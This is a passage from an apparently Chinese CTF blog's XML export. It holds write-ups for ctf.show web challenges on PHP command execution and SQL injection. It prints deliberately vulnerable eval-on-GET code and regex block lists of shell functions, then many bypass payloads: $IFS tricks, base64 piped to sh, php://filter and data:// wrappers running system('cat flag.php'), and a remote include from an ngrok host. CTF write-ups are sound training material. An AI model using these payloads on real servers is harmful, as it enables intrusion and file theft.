invoke__">range</span>(<span class="number">0</span>, <span class="title function_ invoke__">len</span>(num), group_size)</span><br><span class="line">            )</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        rv = num</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span>(rv)</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> ctfshow </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf.show </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>大赛原型</title>
      <link href="/ctfshow/ctf.show/%E5%A4%A7%E8%B5%9B%E5%8E%9F%E5%9E%8B/"/>
      <url>/ctfshow/ctf.show/%E5%A4%A7%E8%B5%9B%E5%8E%9F%E5%9E%8B/</url>
      
        <content type="html"><![CDATA[<h1 id="web680"><a href="#web680" class="headerlink" title="web680"></a>web680</h1><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220415184940885.png" alt="image-20220415184940885"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220415200517421.png" alt="image-20220415200517421"></p><p>看看还剩啥</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">assert,system,passthru,exec,pcntl_exec,shell_exec,popen,proc_open,pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstoped,pcntl_wifsignaled,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,fopen,file_get_contents,fread,file,readfile,opendir,readdir,closedir,rewinddir</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">code=<span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">scandir</span>(<span class="string">&#x27;./&#x27;</span>));</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220415200647646.png" alt="image-20220415200647646"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">code=highlight_file(&quot;secret_you_never_know&quot;);</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220415200719749.png" alt="image-20220415200719749"></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">code=<span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">scandir</span>(<span class="string">&quot;.&quot;</span>));</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">code=<span class="variable">$a</span>=<span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&#x27;glob:///var/www/html/*&#x27;</span>);<span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$f</span>)&#123;<span class="keyword">echo</span>(<span class="variable">$f</span>-&gt;<span class="title function_ invoke__">__toString</span>().<span class="string">&quot; &quot;</span>);&#125;</span><br></pre></td></tr></table></figure><h2 id="RCE总结"><a href="#RCE总结" class="headerlink" title="RCE总结"></a><a href="https://blog.csdn.net/weixin_46706771/article/details/119008895">RCE总结</a></h2><h1 id="web681"><a href="#web681" class="headerlink" title="web681"></a>web681</h1><p>不能扫目录,我们看看字典里有没有,就直接访问了</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220415203154362.png" alt="image-20220415203154362"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220415203139503.png" alt="image-20220415203139503"></p><p>check.php</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2021-09-24 14:58:16</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2021-09-24 16:04:49</span></span><br><span class="line"><span class="comment"> email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;common.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&quot;name&quot;</span>]))&#123;</span><br><span class="line">  <span class="variable">$name</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&#x27;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="title function_ invoke__">trim</span>(<span class="title function_ invoke__">waf</span>(<span class="variable">$_POST</span>[<span class="string">&quot;name&quot;</span>])));</span><br><span class="line">  <span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$name</span>) &gt; <span class="number">11</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;name too long&#x27;)&lt;/script&gt;&quot;</span>);</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;select count(*) from ctfshow_users where username = &#x27;<span class="subst">$name</span>&#x27; or nickname = &#x27;<span class="subst">$name</span>&#x27;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$sql</span>;</span><br><span class="line">    <span class="variable">$db</span> = <span class="keyword">new</span> <span class="title class_">db</span>();</span><br><span class="line">    <span class="variable">$result</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">select_one_array</span>(<span class="variable">$sql</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$result</span>[<span class="number">0</span>])&#123;</span><br><span class="line">      <span class="variable">$_SESSION</span>[<span class="string">&#x27;hat&#x27;</span>] = <span class="string">&#x27;black&#x27;</span>;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&#x27;good job&#x27;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;hat&#x27;</span>] = <span class="string">&#x27;green&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: index.php&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">select <span class="title function_ invoke__">count</span>(*) <span class="keyword">from</span> ctfshow_users where username = <span class="string">&#x27;or/**/(1)#\&#x27; or nickname = &#x27;</span><span class="keyword">or</span><span class="comment">/**/</span>(<span class="number">1</span>)<span class="comment">#\&#x27;</span></span><br></pre></td></tr></table></figure><p>我们添加了\就会把’进行转义</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">or</span><span class="comment">/**/</span>(<span class="number">1</span>)<span class="comment">#\&#x27; or nickname = </span></span><br></pre></td></tr></table></figure><p>查询语句就会变成</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">select <span class="title function_ invoke__">count</span>(*) <span class="keyword">from</span> ctfshow_users where username = <span class="string">&#x27;xxx&#x27;</span><span class="keyword">or</span><span class="comment">/**/</span>(<span class="number">1</span>)<span class="comment">#\&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220416180738970.png" alt="image-20220416180738970"></p>]]></content>
      
      
      <categories>
          
          <category> ctfshow </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf.show </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>命令执行</title>
      <link href="/ctfshow/ctf.show/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
      <url>/ctfshow/ctf.show/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</url>
      
        <content type="html"><![CDATA[<h1 id="web29"><a href="#web29" class="headerlink" title="web29"></a>web29</h1><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203262021706.png" alt="image-20220326202110674"></p><p>源码开局</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203262029492.png" alt="image-20220326202926453"></p><p><strong>拼接</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c=system(&#x27;a=g;cat$IFS$1fla$a.php&#x27;);</span><br><span class="line">c=system(&#x27;1;a=f;d=ag;c=l;cat$IFS$a$c$d.php&#x27;);</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203262029538.png" alt="image-20220326202939503"></p><p>或者</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=system(&quot;nl fla?????&quot;);</span><br><span class="line">?c=system(&quot;nl fla*&quot;);</span><br><span class="line">?c=echo `nl fl&#x27;&#x27;ag.php`;或者c=echo `nl fl“”ag.php`;</span><br><span class="line">?c=echo `nl fl\ag.php`;//转义字符绕过</span><br><span class="line">?c=include($_GET[1]);&amp;1=php://filter/read=convert.base64-encode/resource=flag.php</span><br><span class="line">?c=eval($_GET[zf]);&amp;zf=system(&#x27;nl flag.php&#x27;);</span><br><span class="line">?c=system(&#x27;a=g;cat$IFS$1fla$a.php&#x27;);</span><br><span class="line">?c=system(&#x27;1;a=f;d=ag;c=l;cat$IFS$a$c$d.php&#x27;);</span><br><span class="line">?cecho$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh</span><br><span class="line">?c=system(&#x27;cat$IFS$9`ls`&#x27;);</span><br></pre></td></tr></table></figure><h1 id="web30"><a href="#web30" class="headerlink" title="web30"></a>web30</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment">  Author: h1xa</span></span><br><span class="line"><span class="comment">  Date:   2020-09-04 00:12:34</span></span><br><span class="line"><span class="comment">  Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment">  Last Modified time: 2020-09-04 00:42:26</span></span><br><span class="line"><span class="comment">  email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment">  link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>这里发现多过滤了一个system函数,PHP中执行方法的函数有很多,比如passsthru exec shell_exec </p><p><strong>法一</strong></p><p>使用exec执行函数,虽然exec对执行结果不输出,但是可把执行的结果写入1.txt中,之后在查看1.txt文件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">复制</span><br><span class="line">?c=exec(&#x27;cp fla* 1.txt&#x27;);</span><br><span class="line">拼接</span><br><span class="line">?c=exec(&#x27;cat  &gt; 2.txt&#x27;);</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203292239718.png" alt="image-20220329223900674"></p><p>方法二</p><p>用passthru函数执行命令,与exec的区别是 passthru直接将结果输出,不返回结果,不用使用echo查看结果</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=passthru(&#x27;cat `ls`&#x27;);</span><br></pre></td></tr></table></figure><p>方法三</p><p>在php中echo 命令;也是可以执行并输出的,</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=echo `ls`;</span><br><span class="line">echo `cat fla*`;</span><br></pre></td></tr></table></figure><h2 id="执行命令函数"><a href="#执行命令函数" class="headerlink" title="执行命令函数"></a>执行命令函数</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">system()</span><br><span class="line">passthru()</span><br><span class="line">exec()</span><br><span class="line">shell_exec()</span><br><span class="line">popen()</span><br><span class="line">proc_open()</span><br><span class="line">pcntl_exec()</span><br><span class="line">`` 反引号 同shell_exec() </span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=echo exec(&#x27;nl fla?????&#x27;);</span><br><span class="line">?c=echo `nl fla&#x27;&#x27;g.p&#x27;&#x27;hp`;</span><br><span class="line">?c=echo `nl fla?????`;</span><br><span class="line">还有上一道题的很多payload都可以使用</span><br></pre></td></tr></table></figure><h1 id="web31"><a href="#web31" class="headerlink" title="web31"></a>web31</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment">  Author: h1xa</span></span><br><span class="line"><span class="comment">  Date:   2020-09-04 00:12:34</span></span><br><span class="line"><span class="comment">  Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment">  Last Modified time: 2020-09-04 00:49:10</span></span><br><span class="line"><span class="comment">  email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment">  link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>cat被过滤 空格也被过滤</p><h2 id="linux查看文件"><a href="#linux查看文件" class="headerlink" title="linux查看文件"></a>linux查看文件</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">more:一页一页的显示内容</span><br><span class="line">less:与more类似</span><br><span class="line">head:查看头几行</span><br><span class="line">tac:从最后一行开始显示</span><br><span class="line">cat:的反向显示</span><br><span class="line">tail:查看尾几行</span><br><span class="line">nl:显示的时候顺便输出行号</span><br><span class="line">od:以二进制方法读取内容</span><br><span class="line">vi:一种编辑器</span><br><span class="line">vim:一种编辑器</span><br><span class="line">sort:可以查看</span><br><span class="line">uinq:可以查看 </span><br><span class="line">file -f:报错出具体内容grep</span><br><span class="line">grep:在当前目录中,找出后缀有file字样的文件中包含test字符串的文件,并打印出该字符串的行.</span><br><span class="line">grep test *file strings</span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=eval($_GET[zf]);&amp;zf=system(&#x27;ls&#x27;);</span><br><span class="line">?c=eval($_POST[zf]);POST:zf=system(&#x27;ls&#x27;);</span><br><span class="line">?c=highlight_file(next(array_reverse(scandir(dirname(__FILE__)))));</span><br><span class="line">?c=show_source(next(array_reverse(scandir(pos(localeconv())))));</span><br><span class="line">?c=echo(`nl%09fl[abc]*`);</span><br><span class="line">?c=&quot;\x73\x79\x73\x74\x65\x6d&quot;(&quot;nl%09fl[a]*&quot;);等价于system()</span><br><span class="line">?c=echo`stringsf*`;</span><br><span class="line">?c=echo`strings\$IFS\$9f*`; 必须加转义字符</span><br></pre></td></tr></table></figure><h2 id="php原生方法查看文件"><a href="#php原生方法查看文件" class="headerlink" title="php原生方法查看文件"></a>php原生方法查看文件</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">print_r(scandir(dirname(__FILE__)));查看当前目录下文件</span><br><span class="line">print_r(next(array_reverse(scandir(dirname(__FILE__)))));</span><br><span class="line">c=highlight_file(next(array_reverse(scandir(dirname(__FILE__)))));</span><br></pre></td></tr></table></figure><h1 id="web32"><a href="#web32" class="headerlink" title="web32"></a>web32</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment">  Author: h1xa</span></span><br><span class="line"><span class="comment">  Date:   2020-09-04 00:12:34</span></span><br><span class="line"><span class="comment">  Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment">  Last Modified time: 2020-09-04 00:56:31</span></span><br><span class="line"><span class="comment">  email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment">  link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>include可以不用括号,分号可以用?&gt;代替</p><h2 id="过滤括号include"><a href="#过滤括号include" class="headerlink" title="过滤括号include"></a>过滤括号include</h2><p>payload</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=include$_GET[zf]?&gt;&amp;zf=php://filter/read=convert.base64-encode/resource=flag.php</span><br><span class="line">?c=include$_GET[zf]?&gt;&amp;zf=data://text/plain,&lt;?php system(&quot;cat flag.php&quot;);?&gt;</span><br><span class="line">?c=include$_GET[zf]?&gt;&amp;zf=data://text/plain;base64,PD9waHAgc3lzdGVtKCJjYXQgZmxhZy5waHAiKTs/Pg==</span><br><span class="line">?c=include$_GET[zf]?&gt;&amp;zf=php://input POST:&lt;?php system(&#x27;nl flag.php&#x27;)?&gt;</span><br><span class="line">?c=include$_GET[zf]?&gt;&amp;zf=http://1d40-111-17-194-91.ngrok.io/wanan.txt 远程执行,这里的远程文件是txt的,如果是php就会执行远程服务器上的命令</span><br></pre></td></tr></table></figure><h1 id="web33"><a href="#web33" class="headerlink" title="web33"></a>web33</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment">  Author: h1xa</span></span><br><span class="line"><span class="comment">  Date:   2020-09-04 00:12:34</span></span><br><span class="line"><span class="comment">  Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment">  Last Modified time: 2020-09-04 02:22:27</span></span><br><span class="line"><span class="comment">  email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment">  link: https://ctfer.com</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\&quot;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=include$_GET[zf]?&gt;&amp;zf=php://filter/read=convert.base64-encode/resource=flag.php</span><br><span class="line">?c=include$_GET[zf]?&gt;&amp;zf=data://text/plain,&lt;?php system(&quot;cat flag.php&quot;);?&gt;</span><br><span class="line">?c=include$_GET[zf]?&gt;&amp;zf=data://text/plain;base64,PD9waHAgc3lzdGVtKCJjYXQgZmxhZy5waHAiKTs/Pg==</span><br><span class="line">?c=include$_GET[zf]?&gt;&amp;zf=php://input POST:&lt;?php system(&#x27;nl flag.php&#x27;)?&gt;</span><br><span class="line">?c=include$_GET[zf]?&gt;&amp;zf=http://1d40-111-17-194-91.ngrok.io/wanan.txt 远程执行</span><br></pre></td></tr></table></figure><h1 id="web34"><a href="#web34" class="headerlink" title="web34"></a>web34</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment">  Author: h1xa</span></span><br><span class="line"><span class="comment">  Date:   2020-09-04 00:12:34</span></span><br><span class="line"><span class="comment">  Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment">  Last Modified time: 2020-09-04 04:21:29</span></span><br><span class="line"><span class="comment">  email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment">  link: https://ctfer.com</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\:|\&quot;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=include$_GET[zf]?&gt;&amp;zf=php://filter/read=convert.base64-encode/resource=flag.php</span><br><span class="line">?c=include$_GET[zf]?&gt;&amp;zf=data://text/plain,&lt;?php system(&quot;cat flag.php&quot;);?&gt;</span><br><span class="line">?c=include$_GET[zf]?&gt;&amp;zf=data://text/plain;base64,PD9waHAgc3lzdGVtKCJjYXQgZmxhZy5waHAiKTs/Pg==</span><br><span class="line">?c=include$_GET[zf]?&gt;&amp;zf=php://input POST:&lt;?php system(&#x27;nl flag.php&#x27;)?&gt;</span><br><span class="line">?c=include$_GET[zf]?&gt;&amp;zf=http://1d40-111-17-194-91.ngrok.io/wanan.txt 远程执行</span><br></pre></td></tr></table></figure><h1 id="web35"><a href="#web35" class="headerlink" title="web35"></a>web35</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment">  Author: h1xa</span></span><br><span class="line"><span class="comment">  Date:   2020-09-04 00:12:34</span></span><br><span class="line"><span class="comment">  Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment">  Last Modified time: 2020-09-04 04:21:23</span></span><br><span class="line"><span class="comment">  email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment">  link: https://ctfer.com</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\:|\&quot;|\&lt;|\=/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=include$_GET[zf]?&gt;&amp;zf=php://filter/read=convert.base64-encode/resource=flag.php</span><br><span class="line">?c=include$_GET[zf]?&gt;&amp;zf=data://text/plain,&lt;?php system(&quot;cat flag.php&quot;);?&gt;</span><br><span class="line">?c=include$_GET[zf]?&gt;&amp;zf=data://text/plain;base64,PD9waHAgc3lzdGVtKCJjYXQgZmxhZy5waHAiKTs/Pg==</span><br><span class="line">?c=include$_GET[zf]?&gt;&amp;zf=php://input POST:&lt;?php system(&#x27;nl flag.php&#x27;)?&gt;</span><br><span class="line">?c=include$_GET[zf]?&gt;&amp;zf=http://1d40-111-17-194-91.ngrok.io/wanan.txt 远程执行</span><br></pre></td></tr></table></figure><h1 id="web36"><a href="#web36" class="headerlink" title="web36"></a>web36</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment">  Author: h1xa</span></span><br><span class="line"><span class="comment">  Date:   2020-09-04 00:12:34</span></span><br><span class="line"><span class="comment">  Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment">  Last Modified time: 2020-09-04 04:21:16</span></span><br><span class="line"><span class="comment">  email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment">  link: https://ctfer.com</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\:|\&quot;|\&lt;|\=|\/|[0-9]/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=include$_GET[zf]?&gt;&amp;zf=php://filter/read=convert.base64-encode/resource=flag.php</span><br><span 